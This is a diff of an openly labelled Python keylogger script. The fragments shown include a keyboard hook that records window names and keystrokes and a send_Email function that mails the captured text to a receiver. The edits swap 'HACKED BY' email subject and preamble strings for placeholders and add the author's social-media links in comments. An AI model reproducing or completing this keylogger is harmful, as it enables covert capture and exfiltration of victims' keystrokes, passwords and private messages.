@@ -16,7 +16,7 @@ import socket
 # -------- KeyLogger -------- #
 
 def KeyBoard(event):
-    list.append(event.WindowName)
+    list.append(event.WindowName)                               # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
     list.append("     0=={:::::::::::::::>     ")               # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
     list.append(event.Key)                                      # My GitHub Account ==> "https://github.com/eredot41pkfr"
     list.append("\n")                                           # My İnstagram Account ==> "https://www.instagram.com/eredot41_pk.fr/?hl=tr"
@@ -87,9 +87,9 @@ def send_Email(list):
     msg = MIMEMultipart()
     msg['From'] = email_Sender
     msg['To'] = email_Receiver
-    msg['Subject'] = "Datalar Düştü HACKED !!"    # Email's Subject.
+    msg['Subject'] = "SUBJECT"    # Email's Subject.
     mesaj = msg.as_string()
-    msg.preamble = "*** HACKED BY EREDOT41_PK&FR // SAMET BURGAZOĞLU ***"  # Email's Preamble.
+    msg.preamble = "EMAIL'S PREAMBLE"  # Email's Preamble.
     list_STR = ""
     for lstr in list:
         list_STR = list_STR + "" + lstr
@@ -141,6 +141,7 @@ function_get_machine_ip.start()
                     # My Twitter Account ==> "https://twitter.com/YoksulErdogan"
                     # My GitHub Account ==> "https://github.com/eredot41pkfr"
                     # My İnstagram Account ==> "https://www.instagram.com/eredot41_pk.fr/?hl=tr"
+                    # My Linkedin Account ==> "https://www.linkedin.com/in/erdo%C4%9Fan-yoksul-47897a151/"
                     # Eredot41_PK&FR          0=={:::::::::::::::::::>
 
 
